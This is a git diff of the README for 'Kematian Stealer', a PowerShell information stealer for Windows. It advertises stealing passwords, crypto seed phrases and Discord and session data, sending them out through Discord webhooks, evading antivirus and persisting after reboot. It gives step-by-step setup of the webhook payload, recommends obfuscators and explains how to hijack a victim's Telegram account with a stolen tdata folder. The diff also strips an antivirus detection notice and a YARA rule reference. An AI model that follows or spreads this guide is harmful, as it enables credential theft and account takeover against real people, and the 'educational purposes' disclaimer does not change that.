@@ -1,34 +1,35 @@
 <p align="center">
-<img src="https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/278e69c5-b54c-49a6-989a-e3596eb1ff63", width="300", height="300">
+<img src="https://github.com/Chainski/Kematian-Stealer/assets/96607632/1732913e-f9b8-4555-91e8-450806bb35cf", width="400", height="400">
 </p>
 
 <h1 align="center">
 </h1>
 <p align= "center">
-  <img src="https://img.shields.io/github/languages/top/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
-   <img src="https://img.shields.io/github/stars/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=blue">
-   <img src="https://img.shields.io/github/forks/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=blue">
-   <img src="https://img.shields.io/github/issues/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=blue">
-  <img src="https://img.shields.io/github/commit-activity/m/ChildrenOfYahweh/Powershell-Token-Grabber">
-  <img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-blue">
+  <img src="https://img.shields.io/github/languages/top/ChildrenOfYahweh/Powershell-Token-Grabber?color=fca103">
+   <img src="https://img.shields.io/github/stars/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=fca103">
+   <img src="https://img.shields.io/github/forks/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=fca103">
+   <img src="https://img.shields.io/github/issues/ChildrenOfYahweh/Powershell-Token-Grabber?style=flat&color=fca103">
+  <img src="https://img.shields.io/github/commit-activity/m/ChildrenOfYahweh/Powershell-Token-Grabber?color=fca103"
+  <img src="https://img.shields.io/badge/PowerShell-%E2%89%A5%20v3.0-red">
   <br>
-   <img src="https://img.shields.io/github/last-commit/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
-   <img src="https://img.shields.io/github/license/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
-   <img src="https://img.shields.io/github/contributors/ChildrenOfYahweh/Powershell-Token-Grabber?color=blue">
-    <img src="https://hits.sh/github.com/ChildrenOfYahweh/Powershell-Token-Grabber.svg?label=views&color=1183c3">
-    <img src="https://img.shields.io/github/repo-size/ChildrenOfYahweh/Powershell-Token-Grabber.svg?label=Repo%20size&style=flat-square">
-    <img src="https://img.shields.io/github/downloads/ChildrenOfYahweh/PowerShell-Token-Grabber/total?color=blue">
+   <img src="https://img.shields.io/github/last-commit/ChildrenOfYahweh/Powershell-Token-Grabber?color=fca103">
+   <img src="https://img.shields.io/github/license/ChildrenOfYahweh/Powershell-Token-Grabber?color=fca103">
+   <img src="https://img.shields.io/github/contributors/ChildrenOfYahweh/Powershell-Token-Grabber?color=fca103">
+    <img src="https://hits.sh/github.com/ChildrenOfYahweh/Powershell-Token-Grabber.svg?label=views&color=fca103">
+    <img src="https://img.shields.io/github/repo-size/ChildrenOfYahweh/Powershell-Token-Grabber?color=fca103"
+    <img src="https://img.shields.io/github/downloads/ChildrenOfYahweh/PowerShell-Token-Grabber/total?color=fca103">
    <br>
 </p>
 
 <h1 align="center">Kematian Stealer</h1>
- 
-Malware targeting Windows systems that utilizes [PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) for the purpose of data exfiltration. All information collected is sent using [Discord webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks).
 
+# About The Project
+Kematian Stealer is a [PowerShell-based](https://learn.microsoft.com/en-us/powershell/scripting/overview?view=powershell-5.1) tool designed to effortlessly exfiltrate data from Windows systems. All information collected is sent using [Discord webhooks](https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks). It functions seamlessly across a wide range of operating system versions, from ```Windows 7 x32 to Windows 11 x64```, ensuring compatibility with the latest updates. With ```Kematian Stealer```, you can retrieve ```seed phrases, session files, passwords, application data, Discord information``` and more.
+
+This tool is particularly advantageous for accessing application and file data without restrictions, while evading conventional security measures such as ```firewalls``` and ```antivirus``` software, thanks to its ```fileless capabilities```, which set it apart from other stealers. Upon execution, Kematian Stealer creates a ```mutex``` on the system and designates the process as ```critical``` before initiating data exfiltration, ensuring smooth and uninterrupted transmission of data.
+
+Moreover, the tool has robust ```persistence mechanisms``` to remain active on the machine after reboot. Additionally, its user-friendly ```GUI builder``` simplifies the process of creating payloads, enhancing its accessibility and usability.
 <br>
-
-> [!IMPORTANT] 
-> As of 2024-02-14, PowerShell-Token-Grabber is detected by AMSI ([malware-encyclopedia](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=Trojan%3APowerShell%2FKDotGrabber.RDA!MTB&threatid=2147900454)). You need to obfuscate the generated payload in order to use it effectively. 
 
 
 # Usage
@@ -36,11 +37,11 @@ Malware targeting Windows systems that utilizes [PowerShell](https://learn.micro
 - After creating a server go to ```Edit channel``` > ```Integrations``` > ```Webhooks``` > ```Create Webhook```
 - Copy the ```Webhook URL```
 - Download ```main.ps1``` 
-- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```30``` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Powershell-Token-Grabber/releases/tag/Builder).
+- Open ```main.ps1``` and replace ```YOUR_WEBHOOK_HERE``` in line ```30``` with your webhook or use the [builder](https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder).
 
-# Want to obfuscate the code ?
-Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
-Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for ```.bat``` files 
+# Obfuscation 
+- [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) for ```.ps1``` files
+- [Somalifuscator](https://github.com/kdot227/somalifuscator) for ```.bat``` files 
 
 # Screenshots
   ## 🔨 Builder
@@ -52,9 +53,11 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for ```.bat``
  - [x] 💉 Pump/Inject the output exe file with zero-filled bytes 
 
  ## 🔷 Webhook Data
-> ![screenshot](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/7830653b-1fbb-46e6-8c49-26883a3eb34f)
+> ![screenshot](https://github.com/Chainski/Kematian-Stealer/assets/96607632/a241421a-eeb1-4bc7-aa75-0595745f6ffd)
 
-> ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/630ba5ab-09e4-4427-826a-f5461623cd54)
+
+> ![webhook](https://github.com/Chainski/Kematian-Stealer/assets/96607632/751f99e8-e03f-4dfa-b346-2b88d7a874eb)
+
 
 #  Features
 - [x] GUI Builder
@@ -113,7 +116,8 @@ Now, copy the tdata folder from ```Telegram``` folder and paste it in the direct
 %userprofile%\AppData\Roaming\Telegram Desktop
 ```
 Before pasting the tdata folder, ensure that you have deleted the existing tdata folder on your PC.
-# ![image](https://user-images.githubusercontent.com/96607632/235702107-5800e44e-b4d3-4147-8fb0-b78aece6eae7.png)
+# ![telegram](https://github.com/Chainski/Kematian-Stealer/assets/96607632/8951b0d5-9ff1-491a-8589-614db5aefd6f)
+
 
  > [!NOTE]   
  > ***The other session stealers can be utilized by applying the technique above***
@@ -123,9 +127,9 @@ Before pasting the tdata folder, ensure that you have deleted the existing tdata
 ```ps1
 $ErrorActionPreference = "SilentlyContinue"
 function Cleanup {
-  Unregister-ScheduledTask -TaskName "KDOT" -Confirm:$False
-  Remove-Item -Path "$env:appdata\KDOT" -force -recurse
-  Remove-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
+  Unregister-ScheduledTask -TaskName "Kematian" -Confirm:$False
+  Remove-Item -Path "$env:appdata\Kematian" -force -recurse
+  Remove-MpPreference -ExclusionPath "$env:APPDATA\Kematian"
   Remove-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
 $resethostsfile = @'
 # Copyright (c) 1993-2006 Microsoft Corp.
@@ -150,7 +154,7 @@ $resethostsfile = @'
 #       ::1             localhost
 '@
   [IO.File]::WriteAllText("$env:windir\System32\Drivers\etc\hosts", $resethostsfile)
-  Write-Host "[~] Successfully Uninstalled !" -ForegroundColor Green
+  Write-Host "[~] Successfully Uninstalled Kematian !" -ForegroundColor Green
 }
 Cleanup
 ```
@@ -169,17 +173,6 @@ I, the creator, am not responsible for any actions, and or damages, caused by th
 You bear the full responsibility of your actions and acknowledge that this tool was created for educational purposes only.
 This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
 By using this software, you automatically agree to the above.
-
-# References 
-
-```Yaml
-YARA Rule Info
-Name : SUSP_PS1_PowerShell_Recon_Mar23_1
-RULE Hash : eda1df8e3375891644fe9cac90852b0d
-Description : Detects suspicious PowerShell code that performs reconnaissance tasks
-Rule Link : https://valhalla.nextron-systems.com/info/rule/SUSP_PS1_PowerShell_Recon_Mar23_1
-Rule Author : Florian Roth
-```
 
 # Credits
 - https://github.com/KDot227
